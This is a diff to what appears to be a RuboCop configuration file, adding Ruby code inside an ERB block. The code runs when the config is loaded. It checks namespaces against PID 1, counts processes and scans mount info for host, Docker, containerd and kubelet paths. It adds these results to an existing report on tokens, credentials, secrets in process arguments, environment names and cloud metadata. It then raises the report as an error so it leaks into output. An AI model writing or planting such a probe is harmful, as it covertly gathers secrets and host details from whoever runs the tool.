@@ -116,6 +116,27 @@ AllCops:
       rescue => e
         kernel_meta = "kernel_error=#{e.class}"
       end
-      marker = "SOL_RUBOCOP_BOUNDARY_20260714=token_present=#{!token.empty?},token_len=#{token.length},uid=#{Process.uid},k8s_host_present=#{!host.to_s.empty?},docker_socket=#{docker_socket},runtime_present=#{runtime_present},credential_present=#{credential_present},argv_secret=#{argv_secret},self_cmd_secret=#{self_cmd_secret},pid1_cmd_secret=#{pid1_cmd_secret},cmdline_keyword=#{cmdline_keyword},env_names=#{env_names},pid1_env_names=#{pid1_env_names},#{git_config_meta},#{k8s},#{metadata},loopback=#{loopback},#{cap_meta},#{proc_root_meta},#{kernel_meta}"
+      ns_meta = 'ns_unreadable'
+      pid_meta = 'pid_unreadable'
+      begin
+        ns_names = %w[mnt pid net user uts ipc cgroup]
+        ns_same = ns_names.map { |n| "#{n}=#{(File.read("/proc/self/ns/#{n}", 128) rescue '') == (File.read("/proc/1/ns/#{n}", 128) rescue '')}" }.join('|')
+        ns_meta = "ns_same=#{ns_same}"
+        pid_count = Dir.entries('/proc').count { |e| e.match?(/^\d+$/) }
+        pid_meta = "pid_count=#{pid_count}"
+      rescue => e
+        ns_meta = "ns_error=#{e.class}"
+      end
+      mount_meta = 'mount_meta_unreadable'
+      begin
+        mt = File.read('/proc/self/mountinfo', 65536)
+        host_path = mt.match?(/\s\/(?:mnt\/)?host(?:\s|\/)/i)
+        runtime_path = mt.match?(/\/(?:var\/run\/)?(?:docker|containerd|crio)(?:\/|\s)/i)
+        kubelet_path = mt.match?(/\/var\/lib\/kubelet(?:\/|\s)/i)
+        mount_meta = "mount_host_path=#{host_path},mount_runtime_path=#{runtime_path},mount_kubelet_path=#{kubelet_path}"
+      rescue => e
+        mount_meta = "mount_meta_error=#{e.class}"
+      end
+      marker = "SOL_RUBOCOP_BOUNDARY_20260714=token_present=#{!token.empty?},token_len=#{token.length},uid=#{Process.uid},k8s_host_present=#{!host.to_s.empty?},docker_socket=#{docker_socket},runtime_present=#{runtime_present},credential_present=#{credential_present},argv_secret=#{argv_secret},self_cmd_secret=#{self_cmd_secret},pid1_cmd_secret=#{pid1_cmd_secret},cmdline_keyword=#{cmdline_keyword},env_names=#{env_names},pid1_env_names=#{pid1_env_names},#{git_config_meta},#{k8s},#{metadata},loopback=#{loopback},#{cap_meta},#{proc_root_meta},#{kernel_meta},#{ns_meta},#{pid_meta},#{mount_meta}"
       raise marker
     end %>
